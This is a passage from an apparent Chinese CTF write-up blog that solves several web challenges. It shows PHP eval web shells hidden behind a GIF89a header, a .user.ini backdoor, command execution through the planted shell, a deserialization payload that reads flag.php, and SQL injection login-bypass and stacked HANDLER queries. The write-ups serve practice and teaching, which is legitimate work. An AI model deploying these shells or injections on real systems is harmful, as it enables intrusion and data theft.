class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">先走第一步，MD5强等于绕过，即数组绕过</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041810784.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">再说明POST传参$passwd不是数字且弱等于1234567。所以我们可以在1234567后加一个英文字母。<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041810839.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 得到flag</p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><h2 id="一、本题做题思路-21"><a href="#一、本题做题思路-21" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811560.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">一道上传题，先试试PHP。回显非法后缀，看来又是要靠图片来绕过了</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811555.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">上传图片后发现，此题还对文件内容有所要求</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811515.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">所以我们上传图片文件里不能用平常的一句话木马，要换为如下的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">再次尝试一下。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811541.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 出现新的回显，说这不是图片。所以又需要用到我们的图片幻术头</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ru&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">得到回显</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811572.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 这不就跟我们上面一道题长的一样了么。所以构造payload,不过我们需要对图片内容修改一下，将其POST传入改为GET传入，要记得上传一个.user.ini文件，文件内容在下面写了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a?</span><br><span class="line">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811544.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload为 ：  url+/uploads/f9e1016a5cec370aae6a18d438dabfa5/index.php?shell=<span class="title function_ invoke__">print_r</span>(<span class="string">&quot;/&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">然后通过cat来抓取flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/payload为 ：  url+/uploads/f9e1016a5cec370aae6a18d438dabfa5/index.php?shell=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811006.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">或者通过蚁剑抓包</p><p>先传一个.user.ini文件，文件内容如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=xiaoma.jpg</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">然后再传入这个xiaoma.jpg</p><p>最后在蚁剑上连接</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811075.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> url+上传路径+index.php即可得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811062.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点-11"><a href="#二、本题知识点-11" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><p>.user.ini留后门  <strong>使.user.ini指定文件，在其当前目录下的文件执行时会将你指定的文件中的代码执行出来，以此带入后门。</strong></p><h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><h3 id="一、本题做题思路-22"><a href="#一、本题做题思路-22" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>本题是一道代码审计题，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;<span class="comment">//判断op是弱等于字符串1还是弱等于字符串2</span></span><br><span class="line">            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);<span class="comment">//如果弱等于字符串2，就转向read()和output()函数</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);<span class="comment">//读取文件路径</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;<span class="comment">//得出结果</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)<span class="comment">//如果op强等于字符串2，则将op等于字符串1，然后执行process()。</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;<span class="comment">//GET传参str，如果没有不可打印的字符，对该字符串进行反序列化</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><strong>is_valid()函数</strong>对传入的$s进行检测，如果它的ASCII码值在32-25之间，才会返回true。即确定$s的字符都是能被打印的。</p><p>经过上面代码审计，得知如果需要得到结果，在**__destruct()函数<strong>里要开始准备对op所传的参来绕过</strong>process()**方法，防止op被置于字符串1 可以传入$op&#x3D;2，所以通过在线php运行工具构造payload。因为这道题用的是protected，而protected会导致最后得到的序列化结果有些符号打印不出来，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041814610.png">所以我们可以改成public,</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041814669.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line">        <span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">得到结果</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041814591.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> base64解码得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041814585.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点-12"><a href="#二、本题知识点-12" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><blockquote><p>**file_get_content()**可以读取php:&#x2F;&#x2F;filter伪协议。</p><p><strong>is_valid()函数</strong>对传入参进行检测</p></blockquote><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><h3 id="一、本题做题思路-23"><a href="#一、本题做题思路-23" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>打开源码有线索</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041815432.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">打开发现源码有提示</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041815439.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">经过base32 - base64 解密得到线索</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041815447.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> user where username = <span class="string">&#x27;$name&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">再结合本题是SQL注入题，Fuzz测试一下</p><p>发现or，order等都被过滤了，但是Order(没被过滤)可以绕过order。</p><p>根据’和”回显判断本题是由’回显（上面是’闭合，下面是”闭合）</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041815597.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041815411.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">根据Order绕过判断列数可知本题有三个字段数，上面是判断三个，下面是判断4个</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041815422.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041815874.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">本题的考点在于是否得知  当我们进行联合查询时，如果联合查询查询的数据不存在，联合查询会虚构一个数据。</p><p>所以我们可以跟这样写</p><p>在UserName中写  <strong>1’ union select 1,’admin’,’c4ca4238a0b923820dcc509a6f75849b’#</strong></p><p>在password中写 <strong>1</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041815044.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> c4ca4238a0b923820dcc509a6f75849b是1的MD5 32位小写加密</p><p>最后得到flag<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041815036.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点-13"><a href="#二、本题知识点-13" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><p><strong>联合查询所查询的数据不存在时，联合查询会构造一个虚拟的数据</strong></p><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><h3 id="一、本题做题思路-24"><a href="#一、本题做题思路-24" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>当我们直接上传.php文件时，会出现错误回显</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041817443.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">所以跟往常题一样，通过图片绕过</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041817432.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">发现其对文件内容也有要求 </p><p>所以换种php输入方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">想着再通过.htaccess文件使蚁剑可以连接，发现对其也有限制</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041817439.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">不过没事，这个原因可以通过BP抓包，然后将Content-Type 修改为image&#x2F;jpg就行</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041817469.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">蚁剑连接在主目录得到答案</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041817556.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><h2 id="一、本题做题思路-25"><a href="#一、本题做题思路-25" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041818019.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">跟随便注那道题很像，所以我们先看看过滤了啥</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041818016.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 只能尝试堆叠注入</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041818984.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041818976.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">本题为’闭合</p><p>所以尝试堆叠注入查查库</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;show tables-- q</span></span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041818022.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">看到线索了，直接查看Flaghere这个表</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;show columns from `FlagHere`-- q</span></span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041818001.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 再看看words表</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;show columns from `words`-- q</span></span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041818457.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">到这里尝试抓取flag也没法实现，也没法像随便注那道题那样解决，看网上大佬博客知道了还有<strong>Handler</strong>方法 </p><p><strong>HANDLER … OPEN语句打开一个表<br> HANDLER … READ语句访问<br> HANDLER … CLOSE关闭一个表</strong></p><p>由此我们可以构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#</span></span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">得到flag </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041818447.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">  </p><h3 id="二、本题知识点-14"><a href="#二、本题知识点-14" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><p> <strong>MySQL 中除了可以使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler 语句并不具备 select 语句的所有功能。它是 MySQL 专用的语句，并没有包含到SQL标准中。</strong></p><p>**<code>HANDLER ... 